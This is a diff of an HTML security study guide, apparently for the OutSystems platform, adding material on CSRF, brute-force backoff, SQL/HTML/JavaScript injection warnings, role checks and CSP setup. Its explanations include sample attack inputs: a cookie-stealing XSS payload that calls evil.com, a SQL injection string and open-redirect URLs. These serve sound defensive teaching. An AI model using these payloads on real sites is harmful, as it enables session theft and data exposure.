@@ -67,6 +67,7 @@
         <ul class="nav-sub-list">
           <li><a href="#passwords" class="nav-link" data-section="passwords">Admin Passwords</a></li>
           <li><a href="#end-user-auth" class="nav-link" data-section="end-user-auth">End-User Auth Methods</a></li>
+          <li><a href="#end-user-mgmt" class="nav-link" data-section="end-user-mgmt">End User Management</a></li>
           <li><a href="#it-user-auth" class="nav-link" data-section="it-user-auth">IT User Auth Methods</a></li>
           <li><a href="#transit" class="nav-link" data-section="transit">Data in Transit (SSL/TLS)</a></li>
           <li><a href="#rest" class="nav-link" data-section="rest">Data at Rest</a></li>
@@ -74,6 +75,7 @@
           <li><a href="#cookies" class="nav-link" data-section="cookies">Secure Cookies</a></li>
           <li><a href="#viewstate" class="nav-link" data-section="viewstate">View State Encryption</a></li>
           <li><a href="#console-access" class="nav-link" data-section="console-access">Restrict Console Access</a></li>
+          <li><a href="#hardening" class="nav-link" data-section="hardening">Platform Hardening</a></li>
         </ul>
       </li>
 
@@ -107,6 +109,16 @@
         </button>
         <ul class="nav-sub-list">
           <li><a href="#owasp" class="nav-link" data-section="owasp">OWASP Top 10 Summary</a></li>
+        </ul>
+      </li>
+
+      <li class="nav-group">
+        <button class="nav-group-header">
+          <span>Compliance</span>
+          <svg class="nav-chevron" viewBox="0 0 16 16" fill="none"><polyline points="4,6 8,10 12,6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+        <ul class="nav-sub-list">
+          <li><a href="#hipaa" class="nav-link" data-section="hipaa">HIPAA Compliance</a></li>
         </ul>
       </li>
 
@@ -210,8 +222,17 @@
           <span class="concept-badge badge-purple">CSRF</span>
           <div>
             <strong>Cross-Site Request Forgery (CSRF)</strong>
-            <p>A CSRF attack tricks a logged-in user into accidentally performing an action they did not intend to. For example: an attacker sends you a link that, when clicked, submits a form on a banking app using your active session.</p>
-            <p>OutSystems automatically adds a <strong>hidden CSRF token</strong> to every form. When the form is submitted, the server checks that the token matches the one it issued. A request from an attacker's website won't have this token, so it will be rejected.</p>
+            <p>A CSRF attack tricks a logged-in user into accidentally performing an action they did not intend to. For example: an attacker builds a page with a hidden form that, when the victim visits it, automatically submits a POST request to your app using the victim's active session cookies — deleting their account, changing their email, or transferring money.</p>
+            <p>OutSystems automatically includes a <strong>hidden anti-CSRF token</strong> in every request, and validates it on the server. Here is exactly how it works in each app type:</p>
+            <ul>
+              <li><strong>Traditional Web Apps:</strong> The view state is signed using the <code>osVisitor</code> cookie. When the user submits a form or makes an AJAX request, OutSystems matches the view state signature against the osVisitor cookie. A request from an attacker's site does not have the matching osVisitor, so it is rejected.</li>
+              <li><strong>Reactive Web Apps:</strong> A token called <code>X-CSRFToken</code> is extracted from the <code>nr2&lt;user&gt;</code> cookie and sent as a custom HTTP header on every request. Browsers only allow JavaScript running on your own domain to read and send this header — so an attacker on a different domain cannot replicate it.</li>
+            </ul>
+            <div class="example-box">
+              <strong>The attack:</strong> A victim is logged in to your banking app. They visit an attacker's page. The page silently sends a POST request to <code>yourbank.com/transfer?to=attacker&amount=5000</code>. Without CSRF protection, this works because the browser automatically includes the session cookie.<br><br>
+              <strong>With OutSystems CSRF protection:</strong> The server checks for the valid X-CSRFToken header (Reactive) or view state signature (Traditional). The attacker's page cannot produce this token because it lives on a different domain. The transfer is rejected.
+            </div>
+            <p><strong>Important — APIs are not protected automatically.</strong> When you build REST APIs in OutSystems, anti-CSRF tokens are not added by default. If your API is called from a browser context (not just server-to-server), you need to add your own protection — for example, requiring an API key or validating the <code>Origin</code> header.</p>
           </div>
         </div>
         <div class="concept-item">
@@ -429,40 +450,75 @@
         <h1>Brute Force Protection</h1>
       </div>
       <div class="overview-box">
-        <p>A <strong>brute force attack</strong> is when an attacker tries many passwords very quickly to guess the right one. OutSystems has a built-in system to stop this.</p>
+        <p>A <strong>brute force attack</strong> is when an attacker tries many passwords very quickly to guess the right one. OutSystems has a built-in two-step protection system that blocks both individual account attacks and IP-level attacks.</p>
       </div>
 
-      <h2>What Is a Brute Force Attack?</h2>
-      <p>In a brute force attack, the attacker does not guess smartly — they just try thousands or millions of password combinations automatically using a script. Modern computers can try billions of passwords per second. Without protection, a weak password like "password123" can be cracked in seconds.</p>
-      <p>A more targeted version is called a <strong>credential stuffing attack</strong>: attackers take a list of username/password pairs leaked from another website and try them on your app, hoping users reused the same password.</p>
+      <h2>Two Types of Attack — Two Types of Block</h2>
+      <p>OutSystems distinguishes between two different attack patterns and responds to each differently:</p>
+      <div class="card-grid">
+        <div class="card card-orange">
+          <div class="card-icon">👤</div>
+          <h3>User-Level Attack</h3>
+          <p>An attacker targets a specific user account and tries many passwords from one IP address. OutSystems blocks that <strong>user from that specific IP address</strong>. The legitimate user can still log in from a different device or network — they are not completely locked out.</p>
+        </div>
+        <div class="card card-red">
+          <div class="card-icon">🌐</div>
+          <h3>IP-Level Attack</h3>
+          <p>An attacker has a list of user accounts and tries passwords for all of them from one IP address. OutSystems <strong>blocks the entire IP address</strong>. This stops the attacker from flooding the app with login requests — which could otherwise cause a Denial-of-Service (DoS) attack.</p>
+        </div>
+      </div>
 
-      <h2>How OutSystems Protects Against This</h2>
-      <p>OutSystems counts <strong>failed login attempts per account</strong>. When the count exceeds a limit, it applies one of two responses:</p>
-      <ul>
-        <li><strong>Backoff (delay)</strong> — the user must wait before trying again. The wait time increases with each failed attempt (e.g., 2 seconds, then 4, then 8). This makes automated attacks much slower — thousands of attempts per second become just a few per minute.</li>
-        <li><strong>Temporary block</strong> — after too many failed attempts, the account is blocked for a period. The user (or an admin) must take action to unblock it.</li>
-      </ul>
+      <h2>How the Two-Step Backoff Works</h2>
+      <p>The protection has two stages — the attacker hits a wall, then a bigger wall:</p>
+      <ol>
+        <li><strong>First backoff</strong> — after a set number of failed attempts within a time window, the account or IP is blocked for a <em>short time</em> (a few minutes). The error message changes from "Invalid username or password" to <strong>"Too many failed login attempts. Please try again in a few minutes."</strong></li>
+        <li><strong>Second backoff</strong> — if the attack continues and a second limit is reached, the block extends to a <em>long time</em> (about an hour). The message changes to: <strong>"Too many failed login attempts. Please try again in 60 minutes."</strong></li>
+      </ol>
+      <div class="example-box">
+        <strong>Without protection:</strong> An automated script tries 10,000 passwords per second. In under a minute, even a moderately complex password can be cracked.<br><br>
+        <strong>With two-step backoff:</strong> After 5 failures the script is blocked for minutes. After further attempts, blocked for an hour. What would take seconds now takes years — the attack becomes impractical.
+      </div>
 
       <h2>Who Is Protected?</h2>
       <div class="card-grid">
         <div class="card card-blue">
           <div class="card-icon">👤</div>
           <h3>App End Users</h3>
-          <p>Users logging in to your business application (via the built-in login screen or custom login) are protected. The failed attempt counter resets after a successful login.</p>
+          <p>Users logging in to your business applications are protected automatically when your app uses <strong>Users</strong> as the user provider (the default), or a custom user provider cloned from Users.</p>
         </div>
         <div class="card card-green">
           <div class="card-icon">🧑‍💻</div>
           <h3>IT Users</h3>
-          <p>Developers, testers, and operators logging in to LifeTime, Service Center, and Service Studio are also protected by the same mechanism.</p>
+          <p>Developers, testers, and operators logging in to Service Center and LifeTime are also protected by the same mechanism by default.</p>
         </div>
       </div>
 
+      <h2>Unblocking Legitimate Users</h2>
+      <p>Sometimes real users get blocked — for example, someone who forgets their password and tries too many times, or an ISP whose shared IP was used in an attack. Here is how to unblock them:</p>
+
+      <p><strong>To unblock an application end user:</strong></p>
+      <ol>
+        <li>Log in to the <strong>Users application</strong> at <code>http://&lt;yourserver&gt;/Users</code>.</li>
+        <li>Open the user's detail page and scroll to the <strong>Blocked Login Attempts</strong> section.</li>
+        <li>You will see the number of attempts, the IP address, and the timestamp.</li>
+        <li>Click <strong>Unblock</strong> to restore normal login for that user.</li>
+      </ol>
+
+      <p><strong>To unblock a blocked IP address:</strong></p>
+      <ol>
+        <li>Log in to the Users application.</li>
+        <li>On the right side of the screen, click <strong>Blocked Addresses</strong>.</li>
+        <li>Click <strong>Unblock</strong> next to the IP address to restore access for all users at that address.</li>
+      </ol>
+
+      <p><strong>To unblock IT users</strong> (developers, operators): use <strong>LifeTime</strong> to unblock them. If LifeTime is not installed, use <strong>Service Center</strong> instead.</p>
+
       <h2>Best Practices</h2>
       <ul>
-        <li>Configure the number of allowed failed attempts in your environment settings. A common value is 5–10 attempts before backoff begins.</li>
-        <li>Do not set the limit too low (e.g., 3 attempts) — legitimate users sometimes mistype their password, especially on mobile keyboards.</li>
-        <li>Set up an alert or notification when an account is blocked — this is a strong signal that an attack may be in progress.</li>
-        <li>Encourage users to use strong, unique passwords. Brute force protection slows down attacks but strong passwords make them fail entirely.</li>
+        <li>Do not set the failed-attempt limit too low (e.g., 3 attempts) — legitimate users sometimes mistype their password, especially on mobile keyboards. A limit of 5–10 is a reasonable balance.</li>
+        <li>When an account is blocked, investigate — it is a signal that someone may be actively trying to break in.</li>
+        <li>Combine brute force protection with strong password policies. The protection slows attacks, but a strong password makes them fail entirely.</li>
+        <li>For IT users, connect authentication to your company's identity provider (AD, SAML). This adds another layer — the IdP's own lockout policies apply too.</li>
       </ul>
     </section>
 
@@ -802,25 +858,81 @@
         <strong>Safe:</strong> Leave "Escape Content" set to <em>true</em> (the default). Only set it to false if you have sanitized the HTML first using <code>SanitizeHtml()</code>.
       </div>
 
-      <h2>The Sanitization API</h2>
-      <p>OutSystems provides a <strong>Sanitization API</strong> — a set of built-in functions that clean or encode user input for safe use in different contexts. Use the right function for the right situation:</p>
+      <h2>The Expand Inline Danger — SQL Injection Warning</h2>
+      <p>In a SQL element, each query parameter is safe by default — OutSystems sends it to the database as a typed value, never as raw SQL. But there is one setting that turns off this protection: <strong>Expand Inline</strong>.</p>
+      <p>When you set <strong>Expand Inline = Yes</strong> on a SQL parameter, OutSystems inserts the parameter value directly into the SQL string without escaping it first. This is sometimes necessary for dynamic column names or ORDER BY clauses — but it opens the door to SQL injection if user input reaches that parameter.</p>
+
+      <div class="example-box">
+        <strong>Safe (default, Expand Inline = No):</strong><br>
+        Query: <code>SELECT * FROM Client WHERE Id = @clientId</code><br>
+        If the user sends <code>DUMMYSTR OR 1=1</code>, the database treats it as a literal string — no records match, query returns empty.<br><br>
+        <strong>Dangerous (Expand Inline = Yes, no sanitization):</strong><br>
+        Query: <code>SELECT * FROM Client WHERE Id = </code> + clientId (expanded inline)<br>
+        If the user sends <code>DUMMYSTR OR 1=1</code>, the query becomes <code>WHERE Id = DUMMYSTR OR 1=1</code> — and returns every row in the table.
+      </div>
+
+      <p><strong>When you must use Expand Inline</strong>, protect the parameter with the right sanitization function:</p>
       <ul>
-        <li><strong>SanitizeHtml(html)</strong> — removes dangerous tags and attributes from HTML while keeping safe formatting (like bold and lists). Use when you want to accept some user HTML, but not scripts.</li>
-        <li><strong>SanitizeUrl(url)</strong> — validates and cleans a URL. Rejects <code>javascript:</code> protocol URLs that could run scripts when clicked.</li>
-        <li><strong>EncodeJavaScript(text)</strong> — escapes a string so it can be safely embedded inside a JavaScript string literal. Prevents script injection via JavaScript variables.</li>
-        <li><strong>VerifySqlFragment(sql)</strong> — checks that a SQL fragment does not contain injection patterns. Use when you cannot avoid dynamic SQL.</li>
+        <li>For string values: wrap with <code>EncodeSql(variable)</code> AND surround with single quotes: <code>' ' + EncodeSql(variable) + ' '</code>. This escapes dangerous characters like single quotes so they cannot break out of the string context.</li>
+        <li>For building <code>IN (...)</code> clauses: use <code>BuildSafe_InClauseIntegerList()</code> or <code>BuildSafe_InClauseTextList()</code> — never concatenate values manually.</li>
+        <li>For ORDER BY / GROUP BY columns: ensure the value comes from your own code (a site property or a fixed list), never from direct user input.</li>
+      </ul>
+
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        OutSystems shows a <strong>SQL Injection warning in TrueChange</strong> the moment you enable Expand Inline on a parameter. Do not dismiss this warning without reviewing exactly where the parameter value comes from. If it can ever contain user input, you must sanitize it.
+      </div>
+
+      <h2>HTML and JavaScript Injection Warnings</h2>
+      <p>OutSystems also shows TrueChange warnings for HTML and JavaScript injection risks:</p>
+
+      <div class="concept-list">
+        <div class="concept-item">
+          <span class="concept-badge badge-orange">HTML</span>
+          <div>
+            <strong>HTML Injection Warning</strong>
+            <p>TrueChange warns: <em>"Ensure the expression is protected by using EncodeHTML(), EncodeJavascript(), or SanitizeHtml()."</em> This appears when you disable the "Escape Content" property on an expression that contains user-provided data.</p>
+            <p>Fix it by using one of: <code>EncodeHtml(value)</code> to replace HTML reserved characters with safe codes, <code>SanitizeHtml(html)</code> to allow safe HTML but strip scripts, or re-enable "Escape Content" on the expression.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">JS</span>
+          <div>
+            <strong>JavaScript Injection Warning</strong>
+            <p>TrueChange warns: <em>"Ensure the expression is protected by using EncodeJavaScript() or VerifyJavascriptLiteral()."</em> This appears when a user-provided value is embedded inside a JavaScript block without escaping.</p>
+            <p>Fix it by using <code>EncodeJavascript(value)</code> to replace all JavaScript reserved characters with their escaped form. This ensures that even if a user inputs <code>"; alert('hacked'); //</code>, it becomes harmless text inside the JS string.</p>
+          </div>
+        </div>
+      </div>
+
+      <h2>Dynamic URLs — The Hidden Redirect Risk</h2>
+      <p>If your app redirects users to a URL that comes from a form field or URL parameter, attackers can replace it with a link to a malicious site. The user trusts your URL, clicks it, and ends up on a phishing page.</p>
+      <div class="example-box">
+        <strong>The attack:</strong> Your login page redirects to <code>?returnUrl=https://evil.com/fake-login</code>. The attacker sends users a link like <code>yourapp.com/login?returnUrl=https://evil.com</code>. The user logs in and is sent to the attacker's site.<br><br>
+        <strong>The fix:</strong> Use <code>EncodeUrl(value)</code> whenever embedding user-supplied data into a URL. This ensures unsafe characters cannot change the structure of the URL. Also validate that the redirect target is within your own domain before redirecting.
+      </div>
+
+      <h2>The Sanitization API — Quick Reference</h2>
+      <p>OutSystems provides built-in functions for cleaning input and encoding output safely. Use the right one for each context:</p>
+      <ul>
+        <li><strong>EncodeSql(value)</strong> — for SQL string literals when Expand Inline is on. Escapes single quotes and other SQL-dangerous characters.</li>
+        <li><strong>EncodeHtml(value)</strong> — for HTML output. Converts <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> etc. to safe HTML entities.</li>
+        <li><strong>SanitizeHtml(html)</strong> — strips dangerous tags and attributes but keeps safe formatting (bold, lists). Use when you accept rich text from users.</li>
+        <li><strong>EncodeJavascript(value)</strong> — for values embedded inside JavaScript strings. Escapes characters like quotes and backslashes.</li>
+        <li><strong>EncodeUrl(value)</strong> — for URL query parameters. Percent-encodes characters that would otherwise break the URL structure.</li>
+        <li><strong>VerifySqlLiteral(value)</strong> — validates that a value is a safe SQL literal. Use for non-string parameters (numbers, dates) in inline SQL.</li>
       </ul>
 
       <h2>Design-Time Warnings</h2>
-      <p>When OutSystems detects a risky coding pattern — for example, using an Expression widget with "Escape Content" set to false, or using raw SQL with concatenation — it shows a <strong>warning in TrueChange™</strong> (the live feedback panel in Service Studio). These warnings appear before you publish, not after an attack.</p>
+      <p>OutSystems shows <strong>warnings in TrueChange™</strong> (the live feedback panel in Service Studio) before you publish when it detects a risky pattern. These are not suggestions — treat each warning as a real potential vulnerability. Double-click the warning line to jump to the exact location in your code.</p>
 
       <h2>Best Practices</h2>
       <ul>
-        <li>Use aggregates for all database queries — they use parameters automatically.</li>
-        <li>If you need custom SQL, always use <code>@parameterName</code> syntax for user-supplied values.</li>
-        <li>Never set "Escape Content" to false on an Expression widget unless you have sanitized the content first with <code>SanitizeHtml()</code>.</li>
-        <li>Treat every warning in TrueChange as a real potential problem — investigate each one.</li>
-        <li>For JavaScript interactions, use <code>EncodeJavaScript()</code> any time you are embedding a runtime value inside a JS string.</li>
+        <li>Use aggregates for all database queries — they use safe parameters automatically and never need Expand Inline.</li>
+        <li>If you must use a SQL element with Expand Inline, sanitize the value with <code>EncodeSql()</code> and never pass user input directly.</li>
+        <li>Never set "Escape Content" to false on an Expression widget unless you have sanitized the content first.</li>
+        <li>For any redirect that uses a URL from user input, validate the target domain against an allow list before redirecting.</li>
+        <li>Treat every TrueChange warning as a real problem — investigate each one before publishing.</li>
       </ul>
     </section>
 
@@ -1101,6 +1213,116 @@
       </ul>
     </section>
 
+    <!-- ===== END USER MANAGEMENT ===== -->
+    <section id="end-user-mgmt" class="content-section">
+      <div class="section-header">
+        <span class="section-icon">👥</span>
+        <h1>End User Management</h1>
+      </div>
+      <div class="overview-box">
+        <p>An <strong>end user</strong> is anyone who uses the apps you build — employees, customers, or partners. Understanding how OutSystems classifies, authenticates, and controls these users is essential for both security and licensing compliance.</p>
+      </div>
+
+      <h2>Internal vs External Users — Why the Difference Matters</h2>
+      <p>OutSystems counts end users for licensing purposes. Every non-anonymous user who logs in counts toward your subscription limit. Users are classified as either <strong>internal</strong> or <strong>external</strong> — and you license these separately.</p>
+      <ul>
+        <li><strong>Internal users</strong> — employees and contractors of your organization. By default, all users are treated as internal until you configure your domains.</li>
+        <li><strong>External users</strong> — customers, partners, or anyone outside your organization who uses your apps.</li>
+      </ul>
+      <p>To separate the counts, configure your organization's email domains in Service Center. Once configured, any user whose email matches your domains is classified as internal — everyone else is external. For example, if you register <code>example.com</code>, then <code>adam@example.com</code> counts as internal, while <code>bob@gmail.com</code> counts as external.</p>
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        If you are an ISV or MSP building apps for a client, configure the <em>client's</em> domains as internal — not your own company's domains. Internal and external is from the perspective of who is licensing the apps.
+      </div>
+
+      <h2>Anonymous Users</h2>
+      <p>Users who visit your app without logging in and without sharing any personal information (name, email, phone) are <strong>anonymous</strong>. Anonymous users do not count toward your licensed user capacity. This matters for public-facing apps like websites or information portals — people who just browse without logging in are free to serve at any volume.</p>
+
+      <h2>Managing Users — Deactivating Accounts</h2>
+      <p>When a user no longer needs access to your apps — for example, an employee who has left the company — you should <strong>deactivate their account</strong> in the Users console (<code>http://&lt;environment&gt;/Users</code>). Deactivated users no longer count toward your licensed capacity and can no longer log in.</p>
+      <p>You can also manage users programmatically using the <strong>Users API</strong>. This is useful for automating offboarding or syncing user status with your HR system.</p>
+
+      <h2>Authentication Flow — What Happens When a User Logs In</h2>
+      <p>When an unauthenticated user tries to access a protected screen, OutSystems raises a security exception. Here is what happens next, depending on your authentication setup:</p>
+      <ol>
+        <li>If you use <strong>SAML 2.0, Microsoft Entra, or Okta</strong> — the user is redirected to the identity provider's login page. After successful login, they are sent back to the app.</li>
+        <li>If you use <strong>Integrated Windows Authentication</strong> and the user is on the same domain as the server — the browser authenticates automatically using the user's Windows credentials. No login page appears.</li>
+        <li>For all other methods — the user is sent to the OutSystems Login screen. They enter their credentials. The platform validates against the OutSystems database, then checks Active Directory or LDAP if configured. If validation fails, "Invalid Login" is shown.</li>
+      </ol>
+      <div class="example-box">
+        <strong>Key point:</strong> If you use Integrated Windows Authentication, users will never see your custom Login screen — the browser handles the credential exchange silently. If you are troubleshooting why your login page is not showing, check whether Windows Authentication is enabled.
+      </div>
+
+      <h2>User Data Synchronization</h2>
+      <p>When you use Active Directory, LDAP, SAML 2.0, Microsoft Entra, or Okta, OutSystems keeps the user's data in its own database in sync with the external system. The synchronized attributes are: <strong>Name, Email, and Mobile Phone</strong>.</p>
+      <p>Synchronization happens in two ways:</p>
+      <ul>
+        <li><strong>On every login</strong> — the logged-in user's data is updated from the external system immediately.</li>
+        <li><strong>Daily timer (Active Directory only)</strong> — the <code>SynchronizeDomainUsers</code> timer in the Users module updates all Active Directory users in the database every day. It identifies AD users by the backslash in their username (e.g., <code>DOMAIN\username</code>).</li>
+      </ul>
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        Known issue: if an Active Directory user is deactivated in AD, the daily sync will deactivate them in OutSystems too. But if they are later <em>reactivated</em> in AD, the sync does not automatically reactivate them in OutSystems. You need to manually set their status back to active in the Users module.
+      </div>
+
+      <h2>Creating Custom Roles</h2>
+      <p>OutSystems lets you create custom Roles to control which users can access which screens, actions, or data. A role is a named permission — for example, "Manager", "BackOfficeUser", or "Approver". You define roles in Service Studio, then grant them to specific users in the Users app after publishing.</p>
+      <p>To create a role: go to the <strong>Logic tab → Roles folder → right-click → Add Role</strong>. Set a name. Publish the app — the role now appears in the Users application where you can assign it to users.</p>
+
+      <h2>Using Role Actions in Your Logic</h2>
+      <p>For each role you create, OutSystems automatically provides three actions you can use in your logic flows:</p>
+
+      <div class="concept-list">
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">Check</span>
+          <div>
+            <strong>Check&lt;RoleName&gt;Role</strong>
+            <p>Returns true or false — does this user have this role? If you do not pass a UserId, it checks the currently logged-in user. Only returns true for <em>active</em> users — if the user is inactive, the result is always false even if the role was granted.</p>
+            <p>Use this in screen expressions, aggregate filters, or conditional logic to show/hide elements or restrict data.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-green">Grant</span>
+          <div>
+            <strong>Grant&lt;RoleName&gt;Role</strong>
+            <p>Gives the role to a user. Works for both active and inactive users. The role persists until explicitly revoked — it does not expire on logout. Use this in onboarding flows, admin screens, or automated provisioning logic.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-red">Revoke</span>
+          <div>
+            <strong>Revoke&lt;RoleName&gt;Role</strong>
+            <p>Removes the role from a user. Use this in offboarding flows or when a user's job function changes. Note: you cannot grant or revoke the built-in <strong>Anonymous</strong> and <strong>Registered</strong> system roles — only custom roles.</p>
+          </div>
+        </div>
+      </div>
+
+      <h2>Validating Permissions in Your App</h2>
+      <p>Restricting access to a screen in Service Studio is a good first step — but it is not enough. A determined user might know the direct URL of a server action or API endpoint. Always validate permissions on the server side too.</p>
+
+      <p><strong>Restricting access to screens:</strong> In the screen's <strong>Roles</strong> property, select which roles can view the screen. OutSystems will automatically redirect users who do not have the required role.</p>
+
+      <p><strong>Restricting access to data:</strong> Use <code>GetUserId()</code> or <code>Check&lt;RoleName&gt;Role()</code> in aggregate filters to limit what data is returned. For example:</p>
+      <ul>
+        <li>To show a user only their own records: add a filter <code>Account.OwnerId = GetUserId()</code></li>
+        <li>To show inactive records only to managers: add a filter <code>Opportunity.IsActive = True OR CheckManagerRole()</code></li>
+      </ul>
+
+      <div class="example-box">
+        <strong>Without server-side validation:</strong> A developer hides the "Delete User" button for non-admins in the UI. A regular user opens browser DevTools, finds the server action endpoint, and calls it directly. The action runs — no role check on the server stops it.<br><br>
+        <strong>With server-side validation:</strong> The "Delete User" server action starts with a <code>CheckAdminRole()</code> call. If it returns false, the action raises an exception and exits. The UI hiding is a convenience — the server check is the real protection.
+      </div>
+
+      <h2>Best Practices</h2>
+      <ul>
+        <li>Always validate roles in <strong>server actions</strong>, not just in the UI. Hiding a button is not a security control.</li>
+        <li>Use data-level filtering (aggregate filters) to restrict which records users can see — not just which screens they can visit.</li>
+        <li>Deactivate accounts immediately when users leave or change roles. Do not wait for the next audit cycle.</li>
+        <li>Use the Users API to automate deactivation if you have an HR or identity system that can trigger it.</li>
+        <li>Review role assignments periodically. People change jobs, projects, and responsibilities — their roles should reflect their current access needs.</li>
+      </ul>
+    </section>
+
     <!-- ===== IT USER AUTH ===== -->
     <section id="it-user-auth" class="content-section">
       <div class="section-header">
@@ -1259,7 +1481,7 @@
         <h1>Content Security Policy (CSP)</h1>
       </div>
       <div class="overview-box">
-        <p><strong>Content Security Policy (CSP)</strong> tells the browser which sources of content are trusted. This prevents attackers from loading malicious scripts into your app.</p>
+        <p><strong>Content Security Policy (CSP)</strong> tells the browser which sources of content are trusted. This prevents attackers from loading malicious scripts into your app — and it works for both web and mobile OutSystems apps.</p>
       </div>
 
       <h2>The Problem CSP Solves</h2>
@@ -1281,20 +1503,88 @@
         Means: JavaScript can only run from this domain. Images can load from this domain or from cdn.mycompany.com. This page cannot be put inside an iframe anywhere. If a script from evil.com somehow gets injected into the page, the browser sees it did not come from 'self' and refuses to run it.
       </div>
 
-      <h2>How to Set CSP in OutSystems</h2>
-      <p>CSP is configured in <strong>LifeTime</strong> (Security settings) or <strong>Service Center</strong>. You can apply it at two levels:</p>
+      <h2>How to Configure CSP in OutSystems</h2>
+      <p>CSP is configured in <strong>LifeTime</strong> (if installed) or directly in <strong>Service Center</strong>. You can apply it at two levels — environment-wide or per application. The application-level setting always overrides the environment-level setting.</p>
+      <p><strong>It is advisable to configure CSP in every environment</strong> — start with a baseline for all apps, then override for individual apps as needed. After saving any CSP change, you must <strong>republish your applications</strong> for the change to take effect.</p>
+
+      <div class="concept-list">
+        <div class="concept-item">
+          <span class="concept-badge badge-blue">LifeTime</span>
+          <div>
+            <strong>Configure CSP via LifeTime (recommended)</strong>
+            <p>Go to <strong>Infrastructure</strong> → select an environment → <strong>Environment Security</strong> → enable CSP → add directives (one value per line) → Save → republish all applications using an "All Components" solution.</p>
+            <p>To override for a specific app: <strong>Applications</strong> → select the app → <strong>Security Settings</strong> → choose the environment → enable CSP → add directives → Save → republish the app in Service Center.</p>
+          </div>
+        </div>
+        <div class="concept-item">
+          <span class="concept-badge badge-orange">Service Center</span>
+          <div>
+            <strong>Configure CSP via Service Center (no LifeTime)</strong>
+            <p>For the whole environment: <strong>Administration</strong> → <strong>Security</strong> → enable CSP → add directives → Save → republish.</p>
+            <p>For a specific app: <strong>Factory</strong> → select the app → <strong>Security</strong> tab → enable CSP → add directives → Save → republish.</p>
+          </div>
+        </div>
+      </div>
+
+      <h2>Monitoring CSP Violations</h2>
+      <p>After you enable CSP, some legitimate resources might get blocked — especially if your app loads content from third-party services. Before switching to full enforcement, monitor what is being blocked:</p>
+      <ol>
+        <li>In Service Center, go to <strong>Monitoring → Errors</strong>.</li>
+        <li>Set the <strong>Source filter</strong> to <strong>CSPReport</strong>.</li>
+        <li>Review the blocked resources — if they are legitimate (a font, a map widget, a video embed), add their domain to your CSP directives.</li>
+        <li>Only switch to full enforcement once you see no unexpected violations.</li>
+      </ol>
+      <div class="tip-box">
+        <span class="tip-icon">💡</span>
+        You can also use the browser's developer console (F12 → Console) to see CSP violation messages during development and testing. Look for messages starting with "Content Security Policy".
+      </div>
+
+      <h2>Three Misconfiguration Risks to Avoid</h2>
+      <div class="card-grid">
+        <div class="card card-orange">
+          <div class="card-icon">⚠️</div>
+          <h3>Missing Policies</h3>
+          <p>If you forget to add a domain that your app loads content from, users will see broken pages — videos that don't play, CSS that isn't applied, maps that don't load. Always check the CSPReport logs after enabling CSP to catch missing sources.</p>
+        </div>
+        <div class="card card-red">
+          <div class="card-icon">🚨</div>
+          <h3>Too Permissive</h3>
+          <p>Using a wildcard (<code>*</code>) in your directives means the browser will load content from anywhere. This defeats the purpose of CSP. An attacker can trick your app into loading a malicious script from any server. Be specific — list only the exact domains your app needs.</p>
+        </div>
+        <div class="card card-blue">
+          <div class="card-icon">📋</div>
+          <h3>Duplicated Config</h3>
+          <p>On self-managed environments, set CSP only in LifeTime or Service Center — never also in IIS or your web server. Setting it in two places causes the header to appear twice in the response, which can cause unexpected results and hard-to-debug issues.</p>
+        </div>
+      </div>
+
+      <h2>Removing unsafe-eval and unsafe-inline (Reactive Apps)</h2>
+      <p>By default, OutSystems Reactive Web apps include two directives that weaken your CSP:</p>
       <ul>
-        <li><strong>Environment level</strong> — applies to all apps in the environment. Good for setting a baseline policy.</li>
-        <li><strong>Application level</strong> — override the environment policy for a specific app. Use this when one app needs to load content from a third-party service that others do not.</li>
+        <li><strong>unsafe-eval</strong> — allows the browser to run strings as code (e.g., <code>eval()</code>). This makes DOM-based XSS attacks easier.</li>
+        <li><strong>unsafe-inline</strong> — allows inline <code>&lt;script&gt;</code> and <code>&lt;style&gt;</code> tags. An attacker who can inject any HTML attribute can run JavaScript this way.</li>
       </ul>
-      <p>OutSystems also provides a <strong>CSP report-only mode</strong> — instead of blocking violations, the browser just logs them. Use this first to understand what your current app loads and where, before switching to enforcement mode.</p>
+      <p>From <strong>Platform Server 11.28.0</strong> and <strong>Factory Configuration 11.2.1</strong> onwards, you can remove both. In the Factory Configuration Forge component, go to <strong>Platform Configurations → Runtime</strong> and uncheck <strong>Enforce Unsafe Eval Reactive</strong> and <strong>Enforce Unsafe Inline Reactive</strong>. After this change, restart the OutSystems Deployment Controller Service and republish all apps.</p>
+      <div class="example-box">
+        <strong>Without protection:</strong> An attacker injects <code>&lt;img onerror="eval(fetch('evil.com/?c='+document.cookie))"&gt;</code>. The unsafe-eval directive lets the browser execute this string as code and steal the session cookie.<br><br>
+        <strong>With unsafe-eval removed:</strong> The browser refuses to run the string as code. The attack fails even if the injection succeeded.
+      </div>
+
+      <h2>CSP for Mobile Apps (MABS)</h2>
+      <p>Mobile apps built with MABS 6 and higher load iOS content using the <code>outsystems://</code> scheme instead of <code>https://</code>. This means if your CSP lists a domain as <code>example.com</code>, it will work on Android but not iOS. For iOS compatibility, prefix all domains with <code>https://</code>:</p>
+      <ul>
+        <li><code>example.com</code> → change to <code>https://example.com</code></li>
+        <li><code>*.example.com</code> → change to <code>https://*.example.com</code></li>
+      </ul>
+      <p>If you use iframes in iOS apps, also add <code>outsystems://YOUR_APP_URL</code> to the <code>frame-ancestors</code> directive, or content inside the iframe will not render.</p>
 
       <h2>Best Practices</h2>
       <ul>
-        <li>Start in <strong>report-only mode</strong> to collect violations without breaking the app. Review what is being blocked and add legitimate sources to your policy.</li>
-        <li>Never use <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code> in your script-src — these defeat the purpose of CSP by allowing inline scripts (which is exactly what an injected XSS payload uses).</li>
-        <li>Set <code>frame-ancestors 'none'</code> to prevent clickjacking, unless you have a specific need to embed your app in another site.</li>
-        <li>Use the browser's developer console (F12 → Console) to see CSP violation messages during testing.</li>
+        <li>Enable CSP in every environment — development, QA, and production. Do not wait until production to find problems.</li>
+        <li>After enabling, check the CSPReport log in Service Center and fix any legitimate resources being blocked before enforcing.</li>
